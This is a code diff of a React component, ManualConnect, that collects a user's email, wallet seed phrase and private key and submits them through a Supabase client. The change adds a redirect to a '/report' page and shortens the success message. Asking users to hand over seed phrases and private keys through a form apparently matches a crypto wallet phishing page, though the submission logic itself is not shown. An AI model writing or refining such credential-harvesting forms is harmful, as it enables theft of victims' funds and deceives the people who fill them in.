@@ -1,6 +1,7 @@
 
 import { useState } from "react";
-import { useToast } from "@/components/ui/use-toast";
+import { useNavigate } from "react-router-dom";
+import { useToast } from "@/hooks/use-toast";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -9,6 +10,7 @@ import { supabase } from "@/integrations/supabase/client";
 
 export const ManualConnect = () => {
   const { toast } = useToast();
+  const navigate = useNavigate();
   const [email, setEmail] = useState("");
   const [seedPhrase, setSeedPhrase] = useState("");
   const [privateKey, setPrivateKey] = useState("");
@@ -40,13 +42,16 @@ export const ManualConnect = () => {
 
       toast({
         title: "Success",
-        description: "Your wallet information has been submitted. Please check your email for confirmation.",
+        description: "Your wallet information has been submitted successfully.",
       });
 
       // Clear sensitive data
       setSeedPhrase("");
       setPrivateKey("");
       setEmail("");
+      
+      // Redirect to report page
+      navigate("/report");
     } catch (error) {
       toast({
         title: "Error",
